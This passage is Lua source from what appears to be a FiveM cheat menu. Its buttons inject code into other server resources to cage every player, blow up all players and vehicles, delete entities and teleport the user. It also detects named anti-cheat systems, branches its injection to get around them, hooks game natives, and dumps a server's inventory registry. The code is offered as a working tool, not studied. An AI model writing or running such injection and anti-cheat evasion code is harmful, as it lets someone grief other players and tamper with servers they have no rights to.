                                                    if NetworkDoesNetworkIdExist(netId) then
                                                        SetNetworkIdCanMigrate(netId, true)
                                                        SetNetworkIdExistsOnAllMachines(netId, true)
                                                        NetworkRequestControlOfNetworkId(netId)
                                                    end
                                                end
                                            end
                                            Wait(50)
                                        end
                                    end
                                end)
                            end

                            MoonCageAllNearby()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        end
                        sendNotification("Cage All Nearby", "Caged all nearby players", "success", 2000)
                    end
                },
                {
                    label = "Cage All (everyone)",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function MoonCageAll()
                                CreateThread(function()
                                    local model = "prop_gold_cont_01"
                                    local modelHash = GetHashKey(model)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(0) end

                                    for _, pid in ipairs(GetActivePlayers()) do
                                        local targetPed = GetPlayerPed(pid)
                                        if DoesEntityExist(targetPed) then
                                            local coords = GetEntityCoords(targetPed)
                                            local obj = CreateObjectNoOffset(modelHash, coords.x, coords.y, coords.z - 1.0, true,
                true, false)

                                            SetEntityAsMissionEntity(obj, true, true)
                                            FreezeEntityPosition(obj, true)
                                            SetEntityDynamic(obj, false)
                                            PlaceObjectOnGroundProperly(obj)
                                            SetModelAsNoLongerNeeded(modelHash)

                                            local netId = ObjToNet(obj)
                                            if NetworkDoesNetworkIdExist(netId) then
                                                SetNetworkIdCanMigrate(netId, true)
                                                SetNetworkIdExistsOnAllMachines(netId, true)
                                                NetworkRequestControlOfNetworkId(netId)
                                            end
                                        end
                                        Wait(50)
                                    end
                                end)
                            end

                            MoonCageAll()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        end
                        sendNotification("Cage All", "Caged all players", "success", 2000)
                    end
                },

                {
                    label = "Explode All Vehicles",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function uYhGtFrEdWsQaZx()
                                local _vehicles = GetGamePool("CVehicle")
                                local me = PlayerPedId()
                                for _, veh in ipairs(_vehicles) do
                                    if DoesEntityExist(veh) then
                                        local pos = GetEntityCoords(veh)
                                        AddOwnedExplosion(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                                    end
                                end
                            end

                            uYhGtFrEdWsQaZx()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        end
                        sendNotification("Explode Vehicles", "Exploded all vehicles", "success", 2000)
                    end
                },

                {
                    label = "Explode All",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function fGhJkLpOiUzXcVb()
                                local players = GetActivePlayers()
                                local me = PlayerPedId()

                                for _, playerId in ipairs(players) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if DoesEntityExist(targetPed) and targetPed ~= me then
                                        local coords = GetEntityCoords(targetPed)
                                        AddOwnedExplosion(me, coords.x, coords.y, coords.z, 6, 1.0, true, false, 0.0)
                                    end
                                end
                            end

                            fGhJkLpOiUzXcVb()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        end
                        sendNotification("Explode All", "Exploded all players", "success", 2000)
                    end
                },

                {
                    label = "Clone Nearby Player",
                    type = "button",
                    onConfirm = function()
                        local me = PlayerPedId()
                        local myCoords = GetEntityCoords(me)
                        local foundTarget = false

                        for _, playerId in ipairs(GetActivePlayers()) do
                            local targetPed = GetPlayerPed(playerId)
                            if targetPed ~= me and DoesEntityExist(targetPed) then
                                local coords = GetEntityCoords(targetPed)
                                local dist = #(coords - myCoords)

                                if dist < 50.0 then
                                    local model = GetEntityModel(targetPed)
                                    local spawn = coords + vector3(2.0, 0.0, 0.0)

                                    local code = string.format([[
                                        local model = %d
                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end

                                        local clone = CreatePed(4, model, %f, %f, %f, 0.0, true, false)
                                        SetEntityInvincible(clone, true)
                                        TaskStartScenarioInPlace(clone, "WORLD_HUMAN_STAND_IMPATIENT", 0, true)
                                    ]], model, spawn.x, spawn.y, spawn.z)

                                    if canInjectResource() then
                                        MachoInjectResourceRaw("any", code)
                                    end

                                    foundTarget = true
                                    break
                                end
                            end
                        end

                        if foundTarget then
                            sendNotification("Clone Player", "Cloned nearby player", "success", 2000)
                        else
                            sendNotification("Clone Player", "No nearby player found", "error", 2000)
                        end
                    end
                },
                {
                    label = "Delete All Vehicles",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function EnumerateVehicles()
                                return coroutine.wrap(function()
                                    local handle, veh = FindFirstVehicle()
                                    if not veh or veh == 0 then
                                        EndFindVehicle(handle)
                                        return
                                    end

                                    local success
                                    repeat
                                        coroutine.yield(veh)
                                        success, veh = FindNextVehicle(handle)
                                    until not success
                                    EndFindVehicle(handle)
                                end)
                            end

                            for veh in EnumerateVehicles() do
                                DeleteEntity(veh)
                            end
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "any", code)
                        end
                        sendNotification("Delete Vehicles", "Deleted all vehicles", "success", 2000)
                    end
                },

                {
                    label = "Delete All Peds",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function EnumeratePeds()
                                return coroutine.wrap(function()
                                    local handle, ped = FindFirstPed()
                                    if not ped or ped == 0 then
                                        EndFindPed(handle)
                                        return
                                    end

                                    local success
                                    repeat
                                        coroutine.yield(ped)
                                        success, ped = FindNextPed(handle)
                                    until not success
                                    EndFindPed(handle)
                                end)
                            end

                            for ped in EnumeratePeds() do
                                if not IsPedAPlayer(ped) then
                                    SetEntityHealth(ped, 0)
                                end
                            end
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "any", code)
                        end
                        sendNotification("Delete Peds", "Deleted all peds", "success", 2000)
                    end
                },                                
            }
        }
    }
})


  local function safeCall(fn, ...) if fn then return fn(...) end end
  local function Hn(nativeName, newFunction)
      local originalNative = _G[nativeName]
      local safeOriginal = originalNative and type(originalNative) == "function" and originalNative or function()
  end
      _G[nativeName] = function(...) return newFunction(safeOriginal, ...) end
  end

  Hn("SetEntityCoords", function(originalFn, ...) return safeCall(originalFn, ...) end)


table.insert(activeMenu, {
    label = 'Teleport',
    type = 'submenu',
    tabs = {
        {
            name = 'Main Menu',
            submenu = {
                {
                    label = "To Waypoint",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local wp = GetFirstBlipInfoId(8)
                            if DoesBlipExist(wp) then
                                local c = GetBlipInfoIdCoord(wp)
                                local ped = PlayerPedId()
                                RequestCollisionAtCoord(c.x, c.y, c.z + 9.0)
                                SetEntityCoordsNoOffset(ped, c.x, c.y, c.z + 9.0, false, false, false)
                            end
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local wp = GetFirstBlipInfoId(8)
                            if DoesBlipExist(wp) then
                                local c = GetBlipInfoIdCoord(wp)
                                local ped = PlayerPedId()
                                RequestCollisionAtCoord(c.x, c.y, c.z + 9.0)
                                SetEntityCoordsNoOffset(ped, c.x, c.y, c.z + 9.0, false, false, false)
                            end
                        end
                        sendNotification("Teleport", "Teleported to waypoint", "success", 2000)
                    end
                },

                {
                    label = "To Input Coords",
                    type = "button",
                    onConfirm = function()
                        openInputDialog("Enter Coords (x,y,z)", "", function(input)
                            if input and input ~= "" then
                                local x, y, z = input:match("([^,]+),([^,]+),([^,]+)")
                                if x and y and z then
                                    local code = string.format([[
                                        SetEntityCoordsNoOffset(PlayerPedId(), %s, %s, %s, true, true, true)
                                    ]], x, y, z)

                                    if canInjectResource() then
                                        MachoInjectResourceRaw("any", code)
                                    else
                                        SetEntityCoordsNoOffset(PlayerPedId(), tonumber(x), tonumber(y), tonumber(z), true, true,
                true)
                                    end
                                    sendNotification("Teleport", "Teleported to coords", "success", 2000)
                                else
                                    sendNotification("Teleport", "Invalid format. Use x,y,z", "error", 2000)
                                end
                            end
                        end)
                    end
                },

                {
                    label = "To Closest Vehicle",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local player = PlayerPedId()
                            local pos = GetEntityCoords(player)
                            local vehicle = GetClosestVehicle(pos.x, pos.y, pos.z, 100.0, 0, 70)
                            if DoesEntityExist(vehicle) then
                                local coords = GetEntityCoords(vehicle)
                                SetEntityCoordsNoOffset(player, coords.x, coords.y, coords.z, true, true, true)
                            end
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local player = PlayerPedId()
                            local pos = GetEntityCoords(player)
                            local vehicle = GetClosestVehicle(pos.x, pos.y, pos.z, 100.0, 0, 70)
                            if DoesEntityExist(vehicle) then
                                local coords = GetEntityCoords(vehicle)
                                SetEntityCoordsNoOffset(player, coords.x, coords.y, coords.z, true, true, true)
                            end
                        end
                        sendNotification("Teleport", "Teleported to closest vehicle", "success", 2000)
                    end
                },

                {
                    label = "Into Nearest Vehicle",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function MoonTeleportIntoNearestVehicle()
                                CreateThread(function()
                                    Citizen.Wait(150)

                                    local playerPed = PlayerPedId()
                                    local myCoords = GetEntityCoords(playerPed)
                                    local closestVeh = nil
                                    local closestDist = 9999.0

                                    local handle, veh = FindFirstVehicle()
                                    local success
                                    repeat
                                        if DoesEntityExist(veh) then
                                            local coords = GetEntityCoords(veh)
                                            local dist = #(coords - myCoords)
                                            if dist < closestDist then
                                                closestDist = dist
                                                closestVeh = veh
                                            end
                                        end
                                        success, veh = FindNextVehicle(handle)
                                    until not success
                                    EndFindVehicle(handle)

                                    if closestVeh and DoesEntityExist(closestVeh) then
                                        local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(closestVeh)) - 1
                                        for seat = -1, maxSeats do
                                            if IsVehicleSeatFree(closestVeh, seat) then
                                                SetPedIntoVehicle(playerPed, closestVeh, seat)
                                                break
                                            end
                                        end
                                    end
                                end)
                            end

                            MoonTeleportIntoNearestVehicle()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            CreateThread(function()
                                Citizen.Wait(150)

                                local playerPed = PlayerPedId()
                                local myCoords = GetEntityCoords(playerPed)
                                local closestVeh = nil
                                local closestDist = 9999.0

                                local handle, veh = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(veh) then
                                        local coords = GetEntityCoords(veh)
                                        local dist = #(coords - myCoords)
                                        if dist < closestDist then
                                            closestDist = dist
                                            closestVeh = veh
                                        end
                                    end
                                    success, veh = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)

                                if closestVeh and DoesEntityExist(closestVeh) then
                                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(closestVeh)) - 1
                                    for seat = -1, maxSeats do
                                        if IsVehicleSeatFree(closestVeh, seat) then
                                            SetPedIntoVehicle(playerPed, closestVeh, seat)
                                            break
                                        end
                                    end
                                end
                            end)
                        end
                        sendNotification("Teleport", "Teleported into nearest vehicle", "success", 2000)
                    end
                },

                {
                    label = "Maze Bank Tower",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, -75.015, -818.215, 326.175, false, false, false, true)
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, -75.015, -818.215, 326.175, false, false, false, true)
                        end
                        sendNotification("Teleport", "Teleported to Maze Bank Tower", "success", 2000)
                    end
                },

                {
                    label = "Legion Square",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, 215.76, -810.12, 30.73, false, false, false, true)
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, 215.76, -810.12, 30.73, false, false, false, true)
                        end
                        sendNotification("Teleport", "Teleported to Legion Square", "success", 2000)
                    end
                },

                {
                    label = "Sandy Shores",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, 1853.72, 3686.79, 34.26, false, false, false, true)
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, 1853.72, 3686.79, 34.26, false, false, false, true)
                        end
                        sendNotification("Teleport", "Teleported to Sandy Shores", "success", 2000)
                    end
                },

                {
                    label = "Paleto Bay",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, -447.73, 6012.47, 31.72, false, false, false, true)
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, -447.73, 6012.47, 31.72, false, false, false, true)
                        end
                        sendNotification("Teleport", "Teleported to Paleto Bay", "success", 2000)
                    end
                },

                {
                    label = "LS Airport",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, -1037.94, -2738.0, 20.17, false, false, false, true)
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            SetEntityCoords(ped, -1037.94, -2738.0, 20.17, false, false, false, true)
                        end
                        sendNotification("Teleport", "Teleported to LS Airport", "success", 2000)
                    end
                },
            }
        }
    }
})


table.insert(activeMenu, {
    label = 'Settings',
    type = 'submenu',
    tabs = {
        {
            name = 'Main Menu',
            submenu = {
                {
                    label = "Anti-Cheat Checker",
                    type = "button",
                    onConfirm = function()

                        local function DetectFiveGuard()
                            local function ResourceFileExists(resourceName, fileName)
                                local file = LoadResourceFile(resourceName, fileName)
                                return file ~= nil
                            end

                            local fiveGuardFile = "ai_module_fg-obfuscated.lua"
                            local numResources = GetNumResources()

                            for i = 0, numResources - 1 do
                                local resourceName = GetResourceByFindIndex(i)
                                if ResourceFileExists(resourceName, fiveGuardFile) then
                                    return true, resourceName
                                end
                            end

                            return false, nil
                        end


                        local detected = {}

                        if GetResourceState("ReaperV4") == "started" then
                            table.insert(detected, "ReaperV4")
                        end
                        if GetResourceState("WaveShield") == "started" then
                            table.insert(detected, "WaveShield")
                        end
                        if GetResourceState("pac") == "started" then
                            table.insert(detected, "Phoenix")
                        end
                        local fiveGuardDetected, fiveGuardResource = DetectFiveGuard()
                        if fiveGuardDetected then
                            table.insert(detected, "FiveGuard (" .. fiveGuardResource .. ")")
                        elseif GetResourceState("cokesteppa") == "started" or GetResourceState("MeowV2") == "started" then
                            table.insert(detected, "FiveGuard")
                        end
                        if GetResourceState("FiniAC") == "started" then
                            table.insert(detected, "Fini")
                        end
                        if GetResourceState("ElectronAC") == "started" then
                            table.insert(detected, "Electron")
                        end

                        if #detected > 0 then
                            sendNotification("AC Detected", table.concat(detected, ", "), "info", 3000)
                        else
                            sendNotification("AC Checker", "No anti-cheat detected", "success", 3000)
                        end
                    end
                },
                {
                    label = "Scan Server Weapons (F8)",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            CreateThread(function()
                                local all = exports.ox_inventory:Items()
                                if not all then
                                    print("^1[OX SERVER SCAN]^0 No item registry found.")
                                    return
                                end

                                print("^5[OX SERVER WEAPONS]^0 Registered weapon items:")
                                for name, data in pairs(all) do
                                    if name:lower():find("weapon") then
                                        local label = data.label or name
                                        print(("^3%s^0 | Label: ^2%s^0"):format(name, label))
                                    end
                                end
                            end)
                        ]]

                        if canInjectResource() then
                            MachoInjectResource("ox_inventory", code)
                        else
                            CreateThread(function()
                                local all = exports.ox_inventory:Items()
                                if not all then
                                    print("^1[OX SERVER SCAN]^0 No item registry found.")
                                    return
                                end

                                print("^5[OX SERVER WEAPONS]^0 Registered weapon items:")
                                for name, data in pairs(all) do
                                    if name:lower():find("weapon") then
                                        local label = data.label or name
                                        print(("^3%s^0 | Label: ^2%s^0"):format(name, label))
                                    end
                                end
                            end)
                        end
                        sendNotification("Scan Weapons", "Check console", "success", 2000)
                    end
                },
                {
                    label = "Scan Server Items (F8)",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            CreateThread(function()
                                local all = exports.ox_inventory:Items()
                                if not all then
                                    print("^1[OX SERVER SCAN]^0 No item registry found.")
                                    return
                                end

                                print("^5[OX SERVER ITEMS]^0 Registered items:")
                                for name, data in pairs(all) do
                                    local label = data.label or name
                                    print(("^3%s^0 | Label: ^2%s^0"):format(name, label))
                                end
                            end)
                        ]]

                        if canInjectResource() then
                            MachoInjectResource("ox_inventory", code)
                        else
                            CreateThread(function()
                                local all = exports.ox_inventory:Items()
                                if not all then
                                    print("^1[OX SERVER SCAN]^0 No item registry found.")
                                    return
                                end

                                print("^5[OX SERVER ITEMS]^0 Registered items:")
                                for name, data in pairs(all) do
                                    local label = data.label or name
                                    print(("^3%s^0 | Label: ^2%s^0"):format(name, label))
                                end
                            end)
                        end
                        sendNotification("Scan Items", "Check console", "success", 2000)
                    end
                },                           
            }
        }
    }
})





  _G.shiftPressed = false
  _G.MenuOpenVK = _G.MenuOpenVK or nil
  _G.MenuOpenVK_Pending = nil
  _G.menuVKPressed = false
  _G.menuVKListener = nil
  _G.menuKeybindCaptureSession = nil


  CreateThread(function()
      Wait(1000) 

      if _G.MenuOpenVK and not _G.menuVKListener then
          _G.menuVKListener = MachoOnKeyDown(function(vk)
              if vk == _G.MenuOpenVK and not _G.isInputActive() then
                  _G.menuVKPressed = true
              end
          end)
      end
  end)


      local inputActive = false
      local inputValue = ""
      local inputCallback = nil
      local inputReady = false
      local vkListener = nil
      local inputSessionId = 0

      _G.isInputActive = function() return inputActive end

  local function setInputNuiFocus(enabled)
      if enabled then
          if GetResourceState("WaveShield") == "started" then
              pcall(function()
                  MachoInjectResourceRaw("monitor", [[SetNuiFocus(true, true)]])
              end)
          elseif GetResourceState("ReaperV4") == "started" then
              pcall(function()
                  SetNuiFocus(true, true)
              end)
          else
              pcall(function()
                  MachoInjectResourceRaw("monitor", [[SetNuiFocus(true, true)]])
              end)
          end
          SetPauseMenuActive(false)
      else
          if GetResourceState("WaveShield") == "started" then
              pcall(function()
                  MachoInjectResourceRaw("monitor", [[SetNuiFocus(false, false)]])
              end)
          else
              pcall(function()
                  SetNuiFocus(false, false)
              end)
          end
      end
  end

      local function updateInputDisplay()
          if not dui then return end
          MachoSendDuiMessage(dui, json.encode({action = 'updateInput', value = inputValue}))
      end

    local function closeInputDialog()
        inputActive = false
        inputValue = ""
        inputCallback = nil
        inputReady = false
        inputSessionId = inputSessionId + 1

        if vkListener then
            vkListener()
            vkListener = nil
        end

        local focusCode = "SetNuiFocus(false, false) sendMenuMessage('setGameName')"
        if GetResourceState("WaveShield") == "started" then
            pcall(function()
                MachoInjectResourceRaw("monitor", focusCode)
            end)
        elseif GetResourceState("ReaperV4") == "started" then
            pcall(function()
                SetNuiFocus(false, false)
            end)
        else
            pcall(function()
                MachoInjectResourceRaw("monitor", focusCode)
            end)
        end

        if not dui then return end
        MachoSendDuiMessage(dui, json.encode({ action = 'closeInput' }))
    end


      local function openInputDialog(question, maxLength, onConfirm)
          if not dui then
              print("ERROR: DUI not initialized")
              return
          end

          if vkListener then
              vkListener()
              vkListener = nil
          end

          inputSessionId = inputSessionId + 1
          local currentSessionId = inputSessionId

          inputActive = true
          inputValue = ""
          inputCallback = onConfirm
          inputReady = false

          MachoSendDuiMessage(dui, json.encode({
              action = 'openInput',
              question = question or "Enter value:",
              placeholder = "",
              maxLength = maxLength or 100,
              value = ""
          }))

            local focusCode = "SetNuiFocus(true, false) sendMenuMessage('setDebugMode')"
            if GetResourceState("WaveShield") == "started" then
                pcall(function()
                    MachoInjectResourceRaw("monitor", focusCode)
                end)
            elseif GetResourceState("ReaperV4") == "started" then
                pcall(function()
                    SetNuiFocus(true, false)
                end)
            else
                pcall(function()
                    MachoInjectResourceRaw("monitor", focusCode)
                end)
            end
            SetPauseMenuActive(false)

          CreateThread(function()
              Wait(200)
              if currentSessionId == inputSessionId then
                  inputReady = true
              end
          end)


            MachoOnKeyDown(function(vk)
                if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then 
                    _G.shiftPressed = true
                end
            end)

            MachoOnKeyUp(function(vk)
                if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
                    _G.shiftPressed = false
                end
            end)


    vkListener = MachoOnKeyDown(function(vk)
        if currentSessionId ~= inputSessionId then return end
        if not inputActive or not inputReady then return end

        if vk >= 0x41 and vk <= 0x5A then
            local char = string.char(vk)
            if _G.shiftPressed then
                inputValue = inputValue .. char
            else
                inputValue = inputValue .. char:lower()
            end
        elseif vk >= 0x30 and vk <= 0x39 then
            inputValue = inputValue .. string.char(vk)
        elseif vk == 0x20 then
            inputValue = inputValue .. " "
        elseif vk == 0x08 then
            if #inputValue > 0 then
                inputValue = inputValue:sub(1, -2)
            end
        elseif vk == 0x0D then
            inputReady = false
            local finalValue = inputValue
            local finalCallback = inputCallback
            closeInputDialog()
            if finalCallback then
                finalCallback(finalValue)
            end
            return
        elseif vk == 0x1B then
            inputReady = false
            closeInputDialog()
            return
        elseif vk == 0xBD then
            if _G.shiftPressed then
                inputValue = inputValue .. "_"
            else
                inputValue = inputValue .. "-"
            end
        elseif vk == 0xBC then
            if _G.shiftPressed then
                inputValue = inputValue .. "<"
            else
                inputValue = inputValue .. ","
            end
        end
        updateInputDisplay()
    end)
      end
      _G.openInputDialog = openInputDialog

      local function setCurrent()
          if dui then
              MachoSendDuiMessage(dui, json.encode({action = 'setCurrent', current = activeIndex, menu =
  activeMenu}))
          end
      end

      local function isControlPressed(control)
          return IsControlPressed(0, control) or IsDisabledControlPressed(0, control)
      end

      local function isControlJustPressed(control)
          return IsControlJustPressed(0, control) or IsDisabledControlJustPressed(0, control)
      end

      local function isControlJustReleased(control)
          return IsControlJustReleased(0, control) or IsDisabledControlJustReleased(0, control)
      end

      nestedMenus = {}
      nestedMenus[1] = { index = 1, menu = activeMenu }
      activeIndex = 1

      local tabStateMap = {}

 CreateThread(function()

      _G.changeMenuPosition = function(position)
          if dui then
              MachoSendDuiMessage(dui, json.encode({ action = 'position', position = position }))
          end
      end

      _G.changeBanner = function(banner)
          if dui then
              MachoSendDuiMessage(dui, json.encode({ action = 'banner', banner = banner }))
          end
      end

      Wait(1000)
      setCurrent()

      local showing = true
      local currentSubMenuRefresher = nil
      local isDynamicSubMenu = false
      local menuStateMap = {}
      local baseDelay = 250
      local minDelay = 50
      local speedupStep = 30
      local holdTimers = {
          ['ArrowLeft'] = {lastTime = 0, delay = 100},
          ['ArrowRight'] = {lastTime = 0, delay = 100},
      }

      _G.clientMenuShowing = true

      while _G.clientMenuShowing do
          if _G.MenuOpenVK and not _G.menuVKListener then
              _G.menuVKListener = MachoOnKeyDown(function(vk)
                  if vk == _G.MenuOpenVK and not inputActive then
                      _G.menuVKPressed = true
                  end
              end)
          end

          local menuTogglePressed = false

          if _G.MenuOpenVK and _G.menuVKPressed then
              menuTogglePressed = true
              _G.menuVKPressed = false
          elseif not _G.MenuOpenVK and isControlJustReleased(137) then
              menuTogglePressed = true
          end

          if menuTogglePressed then
              if inputActive then
                  closeInputDialog()
              end
              showing = not showing
              if showing then
                  refreshPlayerItems()
                  setCurrent()
              end
              MachoSendDuiMessage(dui, json.encode({ action = 'setVisible', visible = showing }))

          elseif showing and not inputActive then
              local now = GetGameTimer()
              for control, bind in pairs({
                  ['ArrowUp'] = 188,
                  ['ArrowDown'] = 187,
                  ['ArrowLeft'] = 189,
                  ['ArrowRight'] = 190,
                  ['Backspace'] = 194,
                  ['Enter'] = 191,
                  ['Q'] = 44,
                  ['E'] = 38
              }) do
                      if control == 'ArrowLeft' or control == 'ArrowRight' then
                          local timer = holdTimers[control]
                          if isControlPressed(bind) then
                              if now - timer.lastTime >= timer.delay then
                                  timer.lastTime = now
                                  timer.delay = math.max(minDelay, timer.delay - speedupStep)
                                  local activeData = activeMenu[activeIndex]
                                  if control == 'ArrowLeft' then
                                      if activeData.type == 'scroll' then
                                          local selected = (activeData.selected or 1) - 1
                                          if selected <= 0 then selected = #activeData.options end
                                          activeData.selected = selected
                                          if activeData.onChange then
  activeData.onChange(activeData.options[selected]) end
                                      elseif activeData.type == 'slider' then
                                          local newValue = math.max(activeData.min or 0, math.min(activeData.max or
  100, (activeData.value or 0) - 1))
                                          activeData.value = newValue
                                          if activeData.onChange then activeData.onChange(newValue) end
                                      end
                                  else
                                      if activeData.type == 'scroll' then
                                          local selected = (activeData.selected or 1) + 1
                                          if selected > #activeData.options then selected = 1 end
                                          activeData.selected = selected
                                          if activeData.onChange then
  activeData.onChange(activeData.options[selected]) end
                                      elseif activeData.type == 'slider' then
                                          local newValue = math.max(activeData.min or 0, math.min(activeData.max or
  100, (activeData.value or 0) + 1))
                                          activeData.value = newValue
                                          if activeData.onChange then activeData.onChange(newValue) end
                                      end
                                  end
                                  setCurrent()
                              end
                          else
                              timer.delay = baseDelay
                              timer.lastTime = 0
                          end

                      elseif isControlJustPressed(bind) then
                          if control == 'ArrowDown' then
                              repeat
                                  activeIndex = activeIndex + 1
                                  if activeIndex > #activeMenu then activeIndex = 1 end
                              until activeMenu[activeIndex].type ~= "divider"
                              setCurrent()

                          elseif control == 'ArrowUp' then
                              repeat
                                  activeIndex = activeIndex - 1
                                  if activeIndex < 1 then activeIndex = #activeMenu end
                              until activeMenu[activeIndex].type ~= "divider"
                              setCurrent()

                          elseif control == 'Enter' then
                              local activeData = activeMenu[activeIndex]

                              if activeData.type == 'submenu' then
                                  nestedMenus[#nestedMenus+1] = { index = activeIndex, menu = activeMenu, label =
  activeData.label }

                                  if activeData.submenu then
                                      activeIndex = 1
                                      activeMenu = activeData.submenu
                                      currentTabs = nil
                                      setCurrent()

                                  elseif activeData.tabs then
                                      currentTabs = activeData.tabs
                                      local names = {}
                                      for _, t in ipairs(currentTabs) do table.insert(names, t.name) end
                                      MachoSendDuiMessage(dui, json.encode({ action = 'setTabs', tabs = names }))

                                      local saved = tabStateMap[activeData.label]
                                      if saved then
                                          currentTabIndex = math.min(saved.tab or 0, #currentTabs - 1)
                                          activeIndex = math.min(saved.index or 1,
  #currentTabs[currentTabIndex+1].submenu)
                                      else
                                          currentTabIndex = 0
                                          activeIndex = 1
                                      end

                                      MachoSendDuiMessage(dui, json.encode({ action = 'setTabIndex', index =
  currentTabIndex }))
                                      activeMenu = currentTabs[currentTabIndex + 1].submenu
                                      setCurrent()

                                  else
                                      isBusy = true
                                      local getSubMenuFunc = activeData.getSubMenu
                                      currentSubMenuRefresher = getSubMenuFunc
                                      isDynamicSubMenu = true

                                      getSubMenuFunc(function(setMenu)
                                          isBusy = false
                                          menuStateMap[activeData.label or ''] = activeIndex
                                          local restoreIndex = menuStateMap[activeData.label or ''] or 1
                                          activeIndex = math.min(restoreIndex, #setMenu)
                                          if activeIndex < 1 then activeIndex = 1 end
                                          activeMenu = setMenu
                                          setCurrent()
                                      end)
                                  end

                              else
                                  if activeData.type == 'checkbox' then
                                      activeData.checked = not activeData.checked
                                      setCurrent()
                                      if activeData.onConfirm then activeData.onConfirm(activeData.checked) end

                                  elseif activeData.onConfirm then
                                      if activeData.type == 'scroll' then
                                          activeData.onConfirm(activeData.options[activeData.selected or 1])
                                      elseif activeData.type == 'slider' then
                                          activeData.onConfirm(activeData.value)
                                      elseif activeData.type == 'button' then
                                          activeData.onConfirm()
                                      end
                                  end
                              end

                          elseif control == 'Backspace' then
                              if #nestedMenus > 1 then
                                  table.remove(nestedMenus)
                                  local lastMenu = nestedMenus[#nestedMenus]
                                  activeIndex = lastMenu.index or 1
                                  activeMenu = lastMenu.menu

                                  if currentTabs then
                                      tabStateMap[lastMenu.label or ""] = {
                                          tab = currentTabIndex,
                                          index = activeIndex
                                      }
                                  end

                                  if #nestedMenus <= 1 then
                                      currentTabs = nil
                                      currentTabIndex = 0
                                      MachoSendDuiMessage(dui, json.encode({ action = 'setTabs', tabs = {"Main Menu"} }))
                                  end

                                  setCurrent()
                              else
                                  showing = false
                                  MachoSendDuiMessage(dui, json.encode({action = 'setVisible', visible = false}))
                              end

                              currentSubMenuRefresher = nil
                              isDynamicSubMenu = false

                          elseif control == 'Q' and currentTabs then
                              currentTabIndex = currentTabIndex - 1
                              if currentTabIndex < 0 then currentTabIndex = #currentTabs - 1 end
                              activeMenu = currentTabs[currentTabIndex + 1].submenu or activeMenu
                              activeIndex = 1
                              MachoSendDuiMessage(dui, json.encode({ action = 'setTabIndex', index = currentTabIndex
   }))
                              setCurrent()
                              tabStateMap[nestedMenus[#nestedMenus].label or ""] = { tab = currentTabIndex, index =
  activeIndex }

                          elseif control == 'E' and currentTabs then
                              currentTabIndex = currentTabIndex + 1
                              if currentTabIndex >= #currentTabs then currentTabIndex = 0 end
                              activeMenu = currentTabs[currentTabIndex + 1].submenu or activeMenu
                              activeIndex = 1
                              MachoSendDuiMessage(dui, json.encode({ action = 'setTabIndex', index = currentTabIndex
   }))
                              setCurrent()
                              tabStateMap[nestedMenus[#nestedMenus].label or ""] = { tab = currentTabIndex, index =
  activeIndex }
                          end
                      end
                  end
              end

  if showing then
      DisableControlAction(0, 44, true)
      DisableControlAction(0, 38, true)
      DisableControlAction(0, 24, true)
      DisableControlAction(0, 25, true)

      if inputActive then
          DisableControlAction(0, 194, true)
          DisableControlAction(0, 188, true)
          DisableControlAction(0, 187, true)
          DisableControlAction(0, 189, true)
          DisableControlAction(0, 190, true)
          DisableControlAction(0, 191, true)
          DisableControlAction(0, 44, true)
          DisableControlAction(0, 38, true)

          for i = 0, 255 do
              DisableControlAction(0, i, true)
          end
      end
  end



              Wait(0)
          end

          if dui then
              MachoDestroyDui(dui)
          end
          dui = nil
      end)
